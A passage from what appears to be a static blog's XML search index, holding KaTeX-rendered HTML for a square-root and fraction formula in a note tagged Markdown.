viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067l0 -0c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23390500000000003em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
